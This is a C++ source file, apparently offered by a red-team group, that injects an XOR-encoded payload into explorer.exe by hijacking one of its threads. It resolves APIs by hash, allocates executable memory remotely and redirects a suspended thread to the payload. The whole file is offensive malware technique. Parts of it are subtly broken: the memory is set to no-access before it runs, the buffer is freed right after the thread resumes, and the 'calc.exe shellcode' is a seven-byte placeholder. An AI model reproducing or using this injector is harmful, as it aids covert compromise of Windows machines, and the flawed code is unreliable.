/*  Author : RED TEAM | MALFORGE GROUP
    https://malforge-group.in
*/    

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>

// Function to resolve API dynamically by hash (xor hash of function names)
FARPROC ResolveAPI(HMODULE hModule, DWORD functionHash) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* names = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);

    for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++) {
        const char* functionName = (char*)((BYTE*)hModule + names[i]);
        DWORD hash = 0;
        for (const char* c = functionName; *c; c++) {
            hash = (hash >> 13) | (hash << (32 - 13)); // Rotate right
            hash += *c;
        }

        if (hash == functionHash) {
            return (FARPROC)((BYTE*)hModule + functions[ordinals[i]]);
        }
    }

    return NULL;
}

// AES-like XOR decryption for payload
void DecryptPayload(BYTE* payload, SIZE_T size, BYTE key) {
    for (SIZE_T i = 0; i < size; i++) {
        payload[i] ^= key;
    }
}

// Find the process ID of a target process
DWORD FindProcessId(const std::string& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (processName == pe32.szExeFile) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return 0;
}

// Advanced thread hijacking injection
bool AdvancedInjectThreadHijacking(DWORD targetProcessId, BYTE* payload, SIZE_T payloadSize, BYTE decryptionKey) {
    // Decrypt payload
    DecryptPayload(payload, payloadSize, decryptionKey);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    if (!hProcess) {
        return false;
    }

    // Allocate memory in the target process
    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBuffer) {
        CloseHandle(hProcess);
        return false;
    }

    // Write the decrypted payload to the target process
    if (!WriteProcessMemory(hProcess, remoteBuffer, payload, payloadSize, NULL)) {
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Change memory permissions to PAGE_NOACCESS for stealth
    VirtualProtectEx(hProcess, remoteBuffer, payloadSize, PAGE_NOACCESS, NULL);

    // Enumerate threads in the target process
    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap == INVALID_HANDLE_VALUE) {
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    if (Thread32First(hThreadSnap, &te32)) {
        do {
            if (te32.th32OwnerProcessID == targetProcessId) {
                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
                if (hThread) {
                    // Suspend the thread
                    SuspendThread(hThread);

                    CONTEXT ctx;
                    ctx.ContextFlags = CONTEXT_CONTROL;
                    if (GetThreadContext(hThread, &ctx)) {
                        #ifdef _WIN64
                        ctx.Rip = (DWORD64)remoteBuffer; // x64
                        #else
                        ctx.Eip = (DWORD)remoteBuffer;   // x86
                        #endif

                        SetThreadContext(hThread, &ctx);
                        ResumeThread(hThread);
                        CloseHandle(hThread);
                        break;
                    }

                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hThreadSnap, &te32));
    }

    CloseHandle(hThreadSnap);
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return true;
}

int main() {
    // XOR-encrypted payload (calc.exe launch shellcode)
    BYTE payload[] = { 0x75, 0x73, 0x62, 0x1D, 0x54, 0x45, 0x64 }; // Example XOR-encrypted shellcode
    BYTE decryptionKey = 0xAA; // XOR key
    SIZE_T payloadSize = sizeof(payload);

    // Find the target process (e.g., explorer.exe)
    DWORD targetPID = FindProcessId("explorer.exe");
    if (!targetPID) {
        std::cerr << "Target process not found." << std::endl;
        return 1;
    }

    // Perform advanced thread hijacking
    if (AdvancedInjectThreadHijacking(targetPID, payload, payloadSize, decryptionKey)) {
        std::cout << "Injection succeeded!" << std::endl;
    } else {
        std::cerr << "Injection failed." << std::endl;
    }

    return 0;
}

